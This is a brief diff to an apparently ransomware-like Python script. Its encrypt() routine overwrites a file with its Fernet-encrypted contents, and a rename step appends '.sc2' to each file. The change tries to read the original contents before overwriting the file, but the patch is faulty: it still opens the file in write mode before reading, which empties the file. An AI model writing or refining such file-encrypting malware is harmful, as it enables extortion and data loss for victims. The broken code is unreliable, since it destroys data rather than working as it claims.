@@ -13,7 +13,10 @@ def encrypt(key,f):
     # ENCRIPTA EL ARCHIVO CON LA LLAVE GENERADA
     fer = Fernet(key)
     with open(f,'wb') as file:
-        file.write(fer.encrypt(file.read()))
+        original = file.read()
+        file.close()
+    with open(f,'wb') as file:
+        file.write(fer.encrypt(original))
 def replace_file(file):
     os.rename(file,file+'.sc2')
 
